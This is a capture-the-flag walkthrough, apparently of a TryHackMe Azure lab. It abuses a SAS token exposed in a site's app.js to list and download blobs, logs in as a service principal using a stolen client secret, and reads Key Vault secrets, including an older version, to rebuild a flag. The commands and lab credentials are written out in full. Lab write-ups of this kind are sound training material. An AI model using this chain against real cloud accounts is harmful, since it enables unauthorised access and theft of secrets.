# Setting us up

Either use the creds provided on THM to grab an azure instance

OR

Install the azure cli with
```
curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
```

# 1) Pulling apart what is handed out for free

Navigate to the web portal and inspect the app.js file, 3 lines stand out to us
```
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

Freely giving out the account, and SAS (Shared Access Signature)
<br>
# 2) Following the trust

With the SAS and account details, we start probing around, enumerating what we have

First, lets see what containers exist, using the azure cli command;

``` azure
az storage container list \
  --account-name cryptocabanaf5scjagc \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --output table
```

The lab mentioned something about a "vault", so we shift our focus to the 'vault' container instantly listing what it has for us

```
az storage blob list \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" \
  --output table
```

# There exist a second, more valuable key pair

Vault contains 2 files: seed_phrase (which I believe is the required passphrase on the web portal, didn't work though) and backup-service-account.json (which contains a client_id and their secret.

Grab the backup file with

```
az storage blob download \
  --account-name cryptocabanaf5scjagc \
  --container-name vault \
  --name backup-service-account.json \
  --file service-account.json \
  --sas-token "sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

Yet again, we spot 3 things of intrest
```
"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
"client_secret":"UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
"key_vault_name":"ccabana-kv-f5scjagc",
```
With this new info, we log into this users instance with

```
az login --service-principal \
  --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
  --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
  --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```

After loging in, lets view what's inside this newly discovered vault (key_vault_name in the service-account file)
```
az keyvault secret list \
--vault-name "ccabana-kv-f5scjagc" \
--output table
```

# Obtaining the flag

Output, 4 files with 2 giving us what appears to be part of our flag

```
az keyvault secret show \
--vault-name "ccabana-kv-f5scjagc" \
--name "key-shard-1" \
--query "value" --output tsv
```
Replace key-shard-1 with key-shard-3 to obtain the other half

The middle half of our flag can be found in shard-2, however, its not like the others, so a little enumeration provides us with the key hash strings, using the command
```
az keyvault secret list-versions \
  --vault-name "ccabana-kv-f5scjagc" \
  --name "key-shard-2" \
  --query "[].id" \
  --output tsv
```

With the hash of the older key-shard-2 (2 versions showed up), we can get the middle section of our flag as

```
az keyvault secret show \
  --vault-name "ccabana-kv-f5scjagc" \
  --name "key-shard-2" \
  --version "3d6492d2c6f74123bc754a9ded22b2a0" \
  --query "value" \
  --output tsv
```

Rearrange and obtain the final flag to submit
